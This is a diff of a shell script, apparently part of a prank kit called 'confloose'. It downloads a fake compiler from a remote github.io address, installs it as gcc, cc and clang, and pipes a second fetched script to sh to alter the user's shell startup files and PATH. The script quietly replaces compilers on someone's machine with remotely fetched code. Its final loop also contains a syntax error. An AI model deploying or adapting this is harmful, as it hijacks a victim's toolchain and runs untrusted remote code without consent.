@@ -7,10 +7,14 @@ else
 fi
 
 mkdir -p "$dir"
-file="$dir/gcc"
-curl "https://d-002.github.io/epita/confloose/fake-gcc/gcc" >> "$file"
 
-sed -i "s,GCC_PATH,$(which gcc),g" "$file"
-chmod +x $file
+for name in gcc cc clang; do
+    file="$dir/$name"
+    curl "https://d-002.github.io/epita/confloose/fake-gcc/gcc" >> "$file"
 
-echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-gcc" "'alias cc=gcc; alias clang=gcc; export PATH=\"$dir:\$PATH\"'" | sh
+    sed -i "s,GCC_PATH,$(which $name),g" "$file"
+    chmod +x $file
+done
+
+echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-gcc" "'export PATH=\"$dir:\$PATH\"'" | sh
+for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null done
